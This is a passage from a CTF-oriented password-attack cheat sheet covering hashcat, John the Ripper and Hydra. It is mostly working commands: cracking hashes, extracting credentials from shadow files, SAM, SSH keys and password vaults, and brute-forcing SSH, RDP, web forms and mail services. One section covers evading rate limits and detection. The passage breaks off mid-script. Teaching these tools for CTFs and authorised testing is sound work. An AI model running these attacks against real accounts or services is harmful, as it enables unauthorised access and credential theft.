# Not native hashcat, but complementary approach
# Using rainbow tables (rtgen, rcrack)

# Generate rainbow table
rtgen md5 loweralpha 1 7 0 3800 33554432 0

# Sort table
rtsort *.rt

# Crack using table
rcrack . -h 5f4dcc3b5aa765d61d8327deb882cf99
```

### CTF-Specific Strategies

**Quick hash identification:**

```bash
#!/bin/bash
# Quick hash cracker script

HASH="$1"
HASHLEN=${#HASH}

case $HASHLEN in
    32)
        echo "[*] Trying MD5 (mode 0)"
        hashcat -m 0 -a 0 "$HASH" /usr/share/wordlists/rockyou.txt --force
        echo "[*] Trying NTLM (mode 1000)"
        hashcat -m 1000 -a 0 "$HASH" /usr/share/wordlists/rockyou.txt --force
        ;;
    40)
        echo "[*] Trying SHA-1 (mode 100)"
        hashcat -m 100 -a 0 "$HASH" /usr/share/wordlists/rockyou.txt --force
        ;;
    64)
        echo "[*] Trying SHA-256 (mode 1400)"
        hashcat -m 1400 -a 0 "$HASH" /usr/share/wordlists/rockyou.txt --force
        ;;
    *)
        echo "[!] Unknown hash length: $HASHLEN"
        hashid "$HASH"
        ;;
esac
```

**Progressive attack strategy:**

```bash
# Stage 1: Quick wins (5 minutes)
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force

# Stage 2: Common rules (15 minutes)
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt \
        -r /usr/share/hashcat/rules/best64.rule --force

# Stage 3: More aggressive rules (30 minutes)
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt \
        -r /usr/share/hashcat/rules/d3ad0ne.rule --force

# Stage 4: Hybrid attacks (1 hour)
hashcat -m 0 -a 6 hash.txt /usr/share/wordlists/rockyou.txt ?d?d?d --force
hashcat -m 0 -a 6 hash.txt /usr/share/wordlists/rockyou.txt 20?d?d --force

# Stage 5: Mask attack on common patterns (2+ hours)
hashcat -m 0 -a 3 hash.txt masks.hcmask --force

# Check results after each stage
hashcat -m 0 hash.txt --show
```

**CTF-specific wordlists:**

```bash
# Create CTF-themed wordlist
cat > ctf_words.txt << 'EOF'
flag
ctf
capture
theflag
hackthebox
tryhackme
picoctf
challenge
admin
administrator
root
password
secret
EOF

# Combine with common passwords
cat ctf_words.txt /usr/share/wordlists/rockyou.txt > ctf_combined.txt

# Use with rules
hashcat -m 0 -a 0 hash.txt ctf_combined.txt -r /usr/share/hashcat/rules/best64.rule
```

### Output and Reporting

**Output formats:**

```bash
# Standard output to file
hashcat -m 0 -a 0 hash.txt wordlist.txt -o cracked.txt

# Custom output format
hashcat -m 0 -a 0 hash.txt wordlist.txt -o cracked.txt --outfile-format=2
# 1 = hash[:salt]
# 2 = plain (password only)
# 3 = hex_plain
# 4 = crack_pos (position in wordlist)
# 5 = timestamp absolute
# 6 = timestamp relative

# Output with separator
hashcat -m 0 -a 0 hash.txt wordlist.txt -o cracked.txt --outfile-format=2 --outfile-sep=:

# Show only cracked (from potfile)
hashcat -m 0 hash.txt --show

# Show only uncracked
hashcat -m 0 hash.txt --show --left
```

**Debug and logging:**

```bash
# Enable debug mode
hashcat -m 0 -a 0 hash.txt wordlist.txt --debug-mode=1 --debug-file=debug.log
# Modes:
# 1 = Finding rules
# 2 = Original word
# 3 = Original word + finding rules
# 4 = Original word + applied rules

# Log file
hashcat -m 0 -a 0 hash.txt wordlist.txt --logfile-disable
# Default log: hashcat.log in current directory
```

### Troubleshooting

**Common issues:**

```bash
# Issue: "No devices found"
# Solution: Install proper drivers
sudo apt install nvidia-driver  # For NVIDIA
sudo apt install rocm-opencl-runtime  # For AMD

# Issue: "clCreateCommandQueue(): CL_OUT_OF_RESOURCES"
# Solution: Reduce workload
hashcat -m 0 -a 0 hash.txt wordlist.txt -w 1 -n 1

# Issue: Hash not cracking after hours
# Solutions:
# 1. Verify hash format
hashcat --example-hashes | grep -A 5 "MODE: 0"
# 2. Try different hash modes
# 3. Expand wordlist
# 4. Use more aggressive rules

# Issue: Slow performance
# Solutions:
hashcat -m 0 -a 0 hash.txt wordlist.txt -w 4 -O --force

# Force CPU mode (if GPU issues)
hashcat -m 0 -a 0 hash.txt wordlist.txt -D 1

# Skip already cracked hashes
# (Automatic from potfile)

# Temperature monitoring
hashcat -m 0 -a 0 hash.txt wordlist.txt --hwmon-temp-abort=90
```

**Performance expectations:**

```bash
# Approximate speeds (varies by hardware):

# NVIDIA RTX 3080:
# MD5: ~60 GH/s (60 billion hashes/sec)
# SHA-1: ~20 GH/s
# SHA-256: ~10 GH/s
# NTLM: ~80 GH/s
# bcrypt: ~80 KH/s (much slower)
# WPA2: ~1 MH/s

# CPU only (modern i7):
# MD5: ~2 GH/s
# SHA-256: ~300 MH/s
# bcrypt: ~5 KH/s

# Check your system
hashcat -b -m 0  # Benchmark MD5
hashcat -b -m 1000  # Benchmark NTLM
```

---

## Important Related Topics

- **John the Ripper** - Alternative password cracker with different algorithms
- **Hydra** - Network service brute-forcing
- **CrackMapExec** - Active Directory password spraying
- **Responder** - LLMNR/NBT-NS poisoning for hash capture
- **Impacket** - Network protocol exploitation and credential attacks
- **BloodHound** - Active Directory relationship mapping for privilege escalation paths
- **Empire/Covenant** - Post-exploitation frameworks

---

## John the Ripper

John the Ripper (JtR) is a fast password cracking tool supporting numerous hash formats and attack modes. Essential for credential recovery in CTF scenarios.

### Installation and Setup

```bash
# Verify installation (pre-installed on Kali)
john --version

# Jumbo version includes extended hash support
john --list=formats | head -20

# Check available formats
john --list=formats | grep -i "md5\|sha\|ntlm"

# Update to latest version
sudo apt update
sudo apt install john john-data

# Build from source (for latest features)
git clone https://github.com/openwall/john
cd john/src
./configure && make -s clean && make -sj4
sudo make install
```

### Basic Hash Cracking

```bash
# Simple hash cracking
john hashes.txt

# Specify format explicitly
john --format=raw-md5 md5_hashes.txt
john --format=raw-sha256 sha256_hashes.txt
john --format=NT ntlm_hashes.txt

# Show cracked passwords
john --show hashes.txt
john --show --format=raw-md5 hashes.txt

# Resume interrupted session
john --restore

# Check session status
john --status
```

### Hash Format Detection

```bash
# Identify hash type
hash-identifier
# Paste hash when prompted

# Alternative with hashid
hashid 'hash_string_here'
hashid -m 'hash_string_here'  # Show hashcat mode

# John can auto-detect many formats
john --format=auto hashes.txt
```

### Wordlist Attacks

```bash
# Basic wordlist attack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# With specific format
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt md5_hashes.txt

# Multiple wordlists
john --wordlist=wordlist1.txt,wordlist2.txt,wordlist3.txt hashes.txt

# Custom wordlist location
john --wordlist=/path/to/custom/wordlist.txt hashes.txt

# Common wordlist locations on Kali
ls /usr/share/wordlists/
# rockyou.txt (most common)
# fasttrack.txt
# metasploit/ directory
# dirb/ directory
# wfuzz/ directory

# Extract rockyou if compressed
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### Rule-Based Attacks

```bash
# Apply rules to wordlist (mutation strategies)
john --wordlist=wordlist.txt --rules hashes.txt

# Specific ruleset
john --wordlist=wordlist.txt --rules=best64 hashes.txt
john --wordlist=wordlist.txt --rules=jumbo hashes.txt

# Available rulesets
john --list=rules

# Common rulesets:
# best64 - Best 64 rules for performance
# d3ad0ne - Comprehensive ruleset
# dive - Deep rule diving
# jumbo - All jumbo rules
# single - Single crack mode rules

# Custom rules location
cat ~/.john/john.conf
# Or system-wide: /etc/john/john.conf

# View specific ruleset
john --list=rules:best64 | head -20

# Example custom rule
# Add to john.conf under [List.Rules:Custom]
# $[0-9] - Append digit
# ^[A-Z] - Prepend capital letter
# c - Capitalize first letter
# l - Lowercase all
# u - Uppercase all
```

### Incremental Mode (Brute Force)

```bash
# Pure brute force (very slow)
john --incremental hashes.txt

# Specific character set
john --incremental=Alpha hashes.txt      # Letters only
john --incremental=Digits hashes.txt     # Numbers only
john --incremental=Alnum hashes.txt      # Letters and numbers
john --incremental=LowerNum hashes.txt   # Lowercase + numbers
john --incremental=ASCII hashes.txt      # All ASCII characters

# Custom incremental mode with length limits
john --incremental=Alpha --min-length=6 --max-length=8 hashes.txt

# View available incremental modes
john --list=inc-modes

# Create custom incremental mode
# Edit john.conf:
cat >> ~/.john/john.conf << 'EOF'
[Incremental:Custom]
File = $JOHN/alpha.chr
MinLen = 4
MaxLen = 8
CharCount = 26
EOF
```

### Mask Attacks

```bash
# Mask attack (JtR Jumbo only)
john --mask='?l?l?l?l?d?d?d?d' hashes.txt

# Mask placeholders:
# ?l - lowercase letter
# ?u - uppercase letter
# ?d - digit
# ?s - special character
# ?a - all printable characters
# ?h - lowercase hex (0-9a-f)
# ?H - uppercase hex (0-9A-F)

# Examples
john --mask='?u?l?l?l?l?d?d' hashes.txt          # Password12
john --mask='?u?l?l?l?l?d?d?d?d' hashes.txt      # Password2024
john --mask='admin?d?d?d?d' hashes.txt            # admin1234
john --mask='?l?l?l?l?l?l?d?d' hashes.txt        # password99

# Hybrid attack (wordlist + mask)
john --wordlist=names.txt --mask='?1?d?d?d' hashes.txt  # john123
```

### Single Crack Mode

```bash
# Single crack mode uses username/GECOS fields
# Format: username:hash

# Create file with username context
cat > users_hashes.txt << EOF
john:5f4dcc3b5aa765d61d8327deb882cf99
admin:e10adc3949ba59abbe56e057f20f883e
alice:827ccb0eea8a706c4c34a16891f84e7b
EOF

# Run single mode
john --single users_hashes.txt

# Single mode tries:
# - Username itself
# - Username with common transformations
# - GECOS field information
# - Common patterns

# With format specification
john --single --format=raw-md5 users_hashes.txt
```

### Hash Format Examples

```bash
# MD5 (raw-md5)
echo "5f4dcc3b5aa765d61d8327deb882cf99" > md5.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt md5.txt

# SHA-1 (raw-sha1)
echo "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8" > sha1.txt
john --format=raw-sha1 sha1.txt

# SHA-256 (raw-sha256)
echo "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8" > sha256.txt
john --format=raw-sha256 sha256.txt

# SHA-512 (raw-sha512)
john --format=raw-sha512 sha512.txt

# NTLM (NT)
echo "209C6174DA490CAEB422F3FA5A7AE634" > ntlm.txt
john --format=NT ntlm.txt

# bcrypt
echo "\$2y\$10\$abcdefghijklmnopqrstuv" > bcrypt.txt
john --format=bcrypt bcrypt.txt

# Unix crypt (DES)
john --format=descrypt unix_shadow.txt

# MD5 crypt ($1$)
john --format=md5crypt shadow.txt

# SHA-512 crypt ($6$) - modern Linux
john --format=sha512crypt shadow.txt
```

### Linux Shadow File Cracking

```bash
# Extract hashes from /etc/shadow
sudo unshadow /etc/passwd /etc/shadow > unshadowed.txt

# Or manually format
cat /etc/shadow | grep -v "^#\|^$\|:\*:\|:!:" > shadow_hashes.txt

# Crack
john shadow_hashes.txt
john --format=sha512crypt shadow_hashes.txt

# Show results
john --show shadow_hashes.txt

# Example shadow entry:
# user:$6$salt$hash:18000:0:99999:7:::
# $6$ = SHA-512 crypt
# $1$ = MD5 crypt
# $2a$ or $2y$ = bcrypt
# $5$ = SHA-256 crypt
```

### Windows Hash Cracking

```bash
# NTLM hashes from SAM database
john --format=NT ntlm_hashes.txt

# LM hashes (legacy)
john --format=LM lm_hashes.txt

# NetNTLMv2 (from network capture)
john --format=netntlmv2 netntlmv2.txt

# NTLM hash format: username:hash
cat > windows_hashes.txt << EOF
Administrator:209c6174da490caeb422f3fa5a7ae634
Guest:31d6cfe0d16ae931b73c59d7e0c089c0
EOF

john --format=NT windows_hashes.txt
```

### Web Application Hash Formats

```bash
# MD5(WordPress) - $P$ prefix
john --format=phpass wordpress_hashes.txt

# Joomla
john --format=joomla joomla_hashes.txt

# Drupal 7
john --format=drupal7 drupal_hashes.txt

# Django (PBKDF2-SHA256)
john --format=django django_hashes.txt

# phpBB3
john --format=phpbb3 phpbb3_hashes.txt

# MediaWiki
john --format=mediawiki mediawiki_hashes.txt
```

### Database Hash Cracking

```bash
# MySQL (old password)
john --format=mysql mysql_old.txt

# MySQL (new password - MySQL 4.1+)
john --format=mysql-sha1 mysql_new.txt

# PostgreSQL
john --format=postgres postgres_hashes.txt

# MSSQL (2005)
john --format=mssql05 mssql2005.txt

# MSSQL (2012+)
john --format=mssql12 mssql2012.txt

# Oracle 11g
john --format=oracle11 oracle_hashes.txt

# MongoDB
john --format=mongodb mongodb_hashes.txt
```

### ZIP and Archive Cracking

```bash
# Extract hash from ZIP file
zip2john encrypted.zip > zip_hash.txt

# Crack ZIP hash
john zip_hash.txt

# RAR files
rar2john encrypted.rar > rar_hash.txt
john rar_hash.txt

# 7-Zip files
7z2john encrypted.7z > 7z_hash.txt
john 7z_hash.txt

# PDF files
pdf2john encrypted.pdf > pdf_hash.txt
john pdf_hash.txt
```

### SSH Key Cracking

```bash
# Extract hash from encrypted SSH key
ssh2john id_rsa > ssh_hash.txt

# Crack SSH key passphrase
john ssh_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt

# Show cracked passphrase
john --show ssh_hash.txt
```

### Office Document Cracking

```bash
# Microsoft Office 2007-2013
office2john document.docx > office_hash.txt
john office_hash.txt

# Older Office formats (97-2003)
office2john document.doc > office_old_hash.txt
john office_old_hash.txt

# LibreOffice/OpenOffice
libreoffice2john document.odt > libre_hash.txt
john libre_hash.txt
```

### JWT Cracking

```bash
# Convert JWT to John format
cat > jwt.txt << EOF
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U
EOF

# Or use jwt2john.py if available
# python jwt2john.py jwt_token > jwt_hash.txt

# Crack JWT HMAC secret
john --format=HMAC-SHA256 jwt.txt
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

# For older JtR versions, manual format:
# eyJ...#eyJ... (token#data portion)
```

### Performance Optimization

```bash
# Use all CPU cores
john --fork=4 hashes.txt  # 4 parallel processes

# Show available OpenCL devices (GPU)
john --list=opencl-devices

# GPU acceleration with OpenCL
john --format=sha512crypt-opencl hashes.txt

# CUDA support (NVIDIA GPUs)
john --format=sha512crypt-cuda hashes.txt

# Check format compatibility with OpenCL
john --list=formats | grep -i opencl

# Test performance
john --test
john --test --format=raw-md5
```

### Session Management

```bash
# Save session with name
john --session=mysession hashes.txt

# Restore named session
john --restore=mysession

# View session status
john --status=mysession

# List all sessions
ls ~/.john/*.rec

# Delete session
rm ~/.john/mysession.rec
```

### Output and Logging

```bash
# Verbose output
john --verbosity=5 hashes.txt

# Log to file
john --log-stderr hashes.txt 2> john.log

# Pot file (cracked hashes storage)
cat ~/.john/john.pot

# Show from specific pot file
john --show --pot=custom.pot hashes.txt

# Clear pot file (start fresh)
rm ~/.john/john.pot
```

### Custom Wordlist Generation

```bash
# Generate wordlist from website
cewl https://target.com -d 2 -m 5 -w target_wordlist.txt

# Generate with specific rules
john --stdout --wordlist=base.txt --rules=best64 > mutated.txt

# Combine wordlists
cat wordlist1.txt wordlist2.txt > combined.txt
sort -u combined.txt > unique_wordlist.txt

# Generate wordlist from documents
strings document.pdf > words.txt
cat words.txt | tr ' ' '\n' | sort -u > document_wordlist.txt
```

### Configuration Customization

```bash
# View current configuration
john --list=conf-sections

# Custom configuration file
john --config=custom.conf hashes.txt

# Configuration file locations:
# ~/.john/john.conf (user)
# /etc/john/john.conf (system)

# Example custom rule
cat >> ~/.john/john.conf << 'EOF'
[List.Rules:CTF]
# Append current year
$2$0$2$4
# Append common numbers
$1$2$3
$!
$@
$#
# Capitalize and append
c$1
c$!
EOF

# Use custom rule
john --rules=CTF --wordlist=base.txt hashes.txt
```

### Hash Extraction Tools

```bash
# Windows SAM database
samdump2 SYSTEM SAM > sam_hashes.txt

# Browser saved passwords
# Firefox
python firefox2john.py key4.db > firefox_hash.txt

# Chrome/Chromium (requires master key)
# Extract from Login Data SQLite database

# KeePass database
keepass2john Database.kdbx > keepass_hash.txt
john keepass_hash.txt

# TrueCrypt/VeraCrypt volumes
truecrypt2john volume.tc > tc_hash.txt
john tc_hash.txt

# BitLocker
bitlocker2john -i encrypted.vhd > bitlocker_hash.txt
john bitlocker_hash.txt

# Android backup
ab2john backup.ab > android_hash.txt
john android_hash.txt

# WPA/WPA2 handshake
wpapcap2john capture.cap > wpa_hash.txt
john wpa_hash.txt
```

### Advanced Techniques

```bash
# External mode (custom C code)
john --external=filter hashes.txt

# Markov mode (statistical password generation)
john --markov hashes.txt
john --markov:200 hashes.txt  # Markov level 200

# Prince mode (probability-based combinations)
john --prince=wordlist.txt hashes.txt

# Loopback mode (use cracked passwords to crack others)
john --loopback hashes.txt

# Stdin mode
cat wordlist.txt | john --stdin hashes.txt

# Dynamic formats (custom hash algorithms)
john --list=formats | grep dynamic
john --format=dynamic_0 custom_hashes.txt
```

### Distributed Cracking

```bash
# Split wordlist for multiple machines
split -n l/4 rockyou.txt rockyou_part_

# Node 1
john --wordlist=rockyou_part_aa hashes.txt --session=node1

# Node 2
john --wordlist=rockyou_part_ab hashes.txt --session=node2

# Node 3
john --wordlist=rockyou_part_ac hashes.txt --session=node3

# Node 4
john --wordlist=rockyou_part_ad hashes.txt --session=node4

# Merge results
cat ~/.john/john.pot > combined.pot
```

### Troubleshooting

```bash
# Format not recognized
john --list=formats | grep -i "partial_format_name"

# Check if hash format is correct
echo "hash" | john --stdin --format=raw-md5 --stdout

# No password hashes loaded
# Check file format: username:hash or just hash per line

# Permission denied
sudo john shadow_file.txt

# Out of memory
john --fork=2 hashes.txt  # Reduce parallel processes

# Slow performance
john --test --format=yourformat  # Check if OpenCL available
john --format=yourformat-opencl hashes.txt
```

## Hydra

Hydra is a parallelized network authentication cracker supporting numerous protocols. Essential for brute-forcing web forms, SSH, FTP, and other services.

### Installation and Setup

```bash
# Verify installation (pre-installed on Kali)
hydra -h

# Install if needed
sudo apt update
sudo apt install hydra hydra-gtk

# GUI version
sudo xhydra &
```

### Basic Syntax

```bash
# General syntax
hydra [options] [target] [service] [parameters]

# Basic example
hydra -l username -p password target_ip ssh

# Help for specific module
hydra -U ssh
hydra -U http-post-form
```

### SSH Brute Force

```bash
# Single username, wordlist for passwords
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Wordlist for both username and password
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# Specific port
hydra -l admin -P passwords.txt ssh://192.168.1.100 -s 2222

# Verbose output
hydra -l admin -P passwords.txt ssh://192.168.1.100 -V

# Multiple targets
hydra -L users.txt -P passwords.txt -M targets.txt ssh

# Faster execution (more parallel tasks)
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.100
# -t : number of parallel tasks (default: 16)

# Continue after finding one valid password
hydra -l admin -P passwords.txt ssh://192.168.1.100 -f
# -f : exit after first found pair

# Save output
hydra -l admin -P passwords.txt ssh://192.168.1.100 -o results.txt
```

### FTP Brute Force

```bash
# Basic FTP attack
hydra -l admin -P passwords.txt ftp://192.168.1.100

# Anonymous FTP check
hydra -l anonymous -p anonymous ftp://192.168.1.100

# Custom port
hydra -l admin -P passwords.txt ftp://192.168.1.100 -s 2121

# Continue on successful login
hydra -L users.txt -P passwords.txt ftp://192.168.1.100 -f
```

### HTTP Basic Authentication

```bash
# HTTP Basic Auth
hydra -l admin -P passwords.txt http-get://192.168.1.100/admin

# HTTPS
hydra -l admin -P passwords.txt https-get://192.168.1.100/admin

# With specific path
hydra -l admin -P passwords.txt http-get://192.168.1.100/admin/dashboard
```

### HTTP POST Form Attacks

```bash
# Identify form parameters using browser DevTools
# Network tab -> Submit form -> View POST data

# Basic POST form syntax
hydra -l admin -P passwords.txt target.com http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# Syntax explanation:
# /login.php - form action URL
# username=^USER^&password=^PASS^ - POST parameters (^USER^ and ^PASS^ are placeholders)
# F=incorrect - failure string (text that appears on failed login)
# S=success - success string (alternative to F=)

# Real-world example
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.1.100 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# With cookies
hydra -l admin -P passwords.txt \
  target.com http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=failed:H=Cookie: security=low; PHPSESSID=abc123"

# HTTPS POST
hydra -l admin -P passwords.txt \
  target.com https-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Login failed"

# Custom User-Agent
hydra -l admin -P passwords.txt \
  target.com http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=failed:H=User-Agent: Mozilla/5.0"
```

### HTTP POST Form - Advanced

```bash
# Multiple failure conditions (OR)
hydra -l admin -P passwords.txt \
  target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect:F=failed"

# Success condition instead of failure
hydra -l admin -P passwords.txt \
  target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:S=Welcome"

# Redirect following
hydra -l admin -P passwords.txt \
  target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=failed:H=Follow-redirects: 1"

# Case-insensitive matching
hydra -l admin -P passwords.txt \
  target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=failed:C=/dashboard"

# Complete example with all options
hydra -L users.txt -P passwords.txt \
  -s 8080 \
  -t 10 \
  -w 3 \
  -f \
  -V \
  -o hydra_http_results.txt \
  target.com http-post-form \
  "/api/login:username=^USER^&password=^PASS^&submit=Login:F=Invalid:H=Cookie: sessionid=xyz:H=User-Agent: Custom"

# Options explained:
# -s 8080: custom port
# -t 10: 10 parallel tasks
# -w 3: wait 3 seconds per task timeout
# -f: stop after first valid pair
# -V: verbose (show attempts)
# -o: output file
```

### SMTP Brute Force

```bash
# SMTP enumeration
hydra -L users.txt smtp://192.168.1.100 -V

# SMTP AUTH brute force
hydra -l admin@target.com -P passwords.txt smtp://192.168.1.100

# SMTP on custom port
hydra -l admin -P passwords.txt smtp://192.168.1.100 -s 587

# SMTPS (SSL)
hydra -l admin -P passwords.txt smtps://192.168.1.100
```

### POP3 and IMAP

```bash
# POP3
hydra -l user@domain.com -P passwords.txt pop3://mail.target.com

# POP3S (SSL)
hydra -l user -P passwords.txt pop3s://mail.target.com

# IMAP
hydra -l user@domain.com -P passwords.txt imap://mail.target.com

# IMAPS (SSL)
hydra -l user -P passwords.txt imaps://mail.target.com
```

### MySQL/PostgreSQL/MSSQL

```bash
# MySQL
hydra -l root -P passwords.txt mysql://192.168.1.100

# PostgreSQL
hydra -l postgres -P passwords.txt postgres://192.168.1.100

# MSSQL
hydra -l sa -P passwords.txt mssql://192.168.1.100

# MongoDB
hydra -l admin -P passwords.txt mongodb://192.168.1.100
```

### RDP (Remote Desktop Protocol)

```bash
# RDP brute force
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# Multiple users
hydra -L users.txt -P passwords.txt rdp://192.168.1.100

# Note: RDP bruteforcing can be slow and may lock accounts
# Use carefully with account lockout policies
```

### VNC

```bash
# VNC brute force (password only, no username)
hydra -P passwords.txt vnc://192.168.1.100

# VNC typically doesn't have usernames, just passwords
```

### SMB/Windows Shares

```bash
# SMB brute force
hydra -l administrator -P passwords.txt smb://192.168.1.100

# Samba shares
hydra -L users.txt -P passwords.txt 192.168.1.100 smb

# Pass-the-hash not directly supported, use crackmapexec instead
```

### Telnet

```bash
# Telnet brute force
hydra -l admin -P passwords.txt telnet://192.168.1.100

# Custom port
hydra -l admin -P passwords.txt telnet://192.168.1.100 -s 2323
```

### SNMP

```bash
# SNMP community string brute force
hydra -P community_strings.txt snmp://192.168.1.100

# Common community strings file
cat > snmp_communities.txt << EOF
public
private
community
manager
admin
EOF

hydra -P snmp_communities.txt snmp://192.168.1.100
```

### Proxy Authentication

```bash
# HTTP Proxy
hydra -l user -P passwords.txt http-proxy://proxy.target.com:8080

# SOCKS5 proxy
hydra -l user -P passwords.txt socks5://proxy.target.com:1080
```

### Advanced Options

```bash
# Speed and performance
-t <tasks>      # Parallel tasks (default 16, max 64)
-w <timeout>    # Wait time per task (default 32 seconds)
-c <time>       # Wait time per login attempt  
-W <time>       # Response wait time

# Examples
hydra -l admin -P passwords.txt -t 32 ssh://target.com  # 32 parallel
hydra -l admin -P passwords.txt -w 10 ssh://target.com  # 10s timeout

# Resume functionality
-R              # Restore previous session
hydra -R        # Continue interrupted attack

# Output control
-o <file>       # Write results to file
-b <format>     # Output format (text, json, jsonv1)

hydra -l admin -P pass.txt -o results.txt ssh://target.com
hydra -l admin -P pass.txt -b json -o results.json ssh://target.com

# Debugging
-d              # Debug mode
-v / -V         # Verbose output
-q              # Quiet mode (only show found pairs)

# Combination attacks
-e nsr          # Try additional passwords
                # n: null password
                # s: login as password
                # r: reversed login as password

hydra -L users.txt -e nsr ssh://target.com
# Will try:
# user: (empty)
# user: user
# user: resu

# Exit conditions
-f              # Exit after first found pair per user
-F              # Exit after first found pair globally

# Proxy usage
-m <options>    # Module-specific options
hydra -l admin -P pass.txt -m "NTLM:192.168.1.50:80" target.com http-get
```

### Creating Custom Wordlists

```bash
# Generate username variations
cat > users_base.txt << EOF
admin
administrator
root
user
EOF

# Generate common passwords
cat > passwords.txt << EOF
password
Password123
admin123
letmein
123456
qwerty
EOF

# Combine with crunch for patterns
crunch 6 8 -t admin%%% > admin_passwords.txt
# Generates: admin000 to admin999

# User enumeration from company info
cewl https://target.com -w company_words.txt
# Use for both usernames and passwords
```

### Hydra with Burp Suite

```bash
# Capture request in Burp
# Copy POST parameters and failure string

# Example workflow:
# 1. Intercept login request in Burp
# 2. Note POST parameters: email=test&password=test&submit=Login
# 3. Note failure indicator: "Invalid credentials"
# 4. Construct hydra command:

hydra -l admin@target.com -P passwords.txt \
  target.com https-post-form \
  "/api/v1/login:email=^USER^&password=^PASS^&submit=Login:F=Invalid credentials:H=Content-Type: application/x-www-form-urlencoded"
```

### Rate Limiting and Evasion

```bash
# Slow down attacks to avoid detection/rate limiting
hydra -l admin -P passwords.txt -t 1 -w 30 ssh://target.com
# -t 1: only 1 task
# -w 30: wait 30 seconds between attempts

# Random delay between attempts
# Use custom script wrapper:
while read pass; do
  hydra -l admin -p "$pass" ssh://target.com -t 1 -f
  sleep $((RANDOM % 10 + 5))  # Random 5-15 second delay
done < passwords.txt
```

### Multiple Targets

```bash
# Create targets file
cat > targets.txt << EOF
192.168.1.100
192.168.1.101
192.168.1.102
EOF

# Attack multiple targets
hydra -L users.txt -P passwords.txt -M targets.txt ssh

# Different services on different ports
# Use shell loop:
for ip in $(cat targets.txt); do
  hydra -l admin -P passwords.txt ssh://$ip
  hydra -l admin -P passwords.txt ftp://$ip  
done
```

### Service-Specific Modules

```bash
# List all supported services
hydra -h | grep "Supported services"

# Common CTF services:
# cisco          - Cisco AAA
# cisco-enable   - Cisco enable password
# cvs            - CVS pserver
# firebird       - Firebird database
# http-head      - HTTP HEAD method
# http-proxy     - HTTP proxy
# http-proxy-urlenum - HTTP proxy URL enum
# irc            - IRC
# ldap2          - LDAP v2
# ldap3          - LDAP v3
# memcached      - Memc

# LDAP authentication
hydra -l "cn=admin,dc=example,dc=com" -P passwords.txt ldap3://192.168.1.100

# IRC authentication
hydra -l username -P passwords.txt irc://irc.server.com

# Oracle Listener
hydra -l system -P passwords.txt oracle-listener://192.168.1.100

# Oracle SID
hydra -l system -P passwords.txt oracle-sid://192.168.1.100

# Cisco devices
hydra -P passwords.txt cisco://192.168.1.1
hydra -P passwords.txt cisco-enable://192.168.1.1

# Rexec (remote execution)
hydra -l root -P passwords.txt rexec://192.168.1.100

# Rlogin
hydra -l root -P passwords.txt rlogin://192.168.1.100

# RSH (remote shell)
hydra -l root -P passwords.txt rsh://192.168.1.100

# Redis (no authentication by default, but can be configured)
hydra -P passwords.txt redis://192.168.1.100

# SVN (Subversion)
hydra -l admin -P passwords.txt svn://192.168.1.100/repo
```

### HTTP Form Analysis

```bash
# Detailed form analysis steps

# Step 1: Identify form parameters
# Open browser DevTools (F12)
# Navigate to login page
# Switch to Network tab
# Submit login form with test credentials
# Find POST request, view Form Data

# Example output:
# username: testuser
# password: testpass
# csrf_token: abc123xyz
# submit: Login

# Step 2: Identify failure indicator
# Look at response for unique failure text
# Common examples:
# "Invalid username or password"
# "Login failed"
# "Incorrect credentials"
# Error message in JSON: {"error":"Invalid"}

# Step 3: Handle CSRF tokens
# If CSRF token required, use advanced techniques

# For dynamic CSRF tokens, Hydra limitations:
# Hydra doesn't handle CSRF well, use alternatives:
# - Patator (better CSRF handling)
# - Custom Python script with requests/BeautifulSoup

# Example with static elements:
hydra -l admin -P passwords.txt \
  target.com http-post-form \
  "/login.php:username=^USER^&password=^PASS^&csrf=STATIC_TOKEN&submit=Login:F=Invalid"
```

### Custom HTTP Headers

```bash
# Multiple custom headers
hydra -l admin -P passwords.txt \
  target.com http-post-form \
  "/api/login:username=^USER^&password=^PASS^:F=failed:H=Content-Type: application/json:H=X-API-Key: secret123:H=Accept: application/json"

# Session cookies
hydra -l admin -P passwords.txt \
  target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid:H=Cookie: PHPSESSID=abc123; security=low"

# Referer header
hydra -l admin -P passwords.txt \
  target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=failed:H=Referer: https://target.com/index.php"
```

### JSON API Authentication

```bash
# JSON POST body
# Note: Hydra expects form-encoded by default
# Workaround for JSON APIs:

# Method 1: Try form-encoded (some APIs accept both)
hydra -l admin -P passwords.txt \
  target.com http-post-form \
  "/api/v1/auth:username=^USER^&password=^PASS^:F=error:H=Content-Type: application/json"

# Method 2: Use custom wrapper script
cat > hydra_json_wrapper.sh << 'EOF'
#!/bin/bash
USER=$1
PASS=$2
RESULT=$(curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
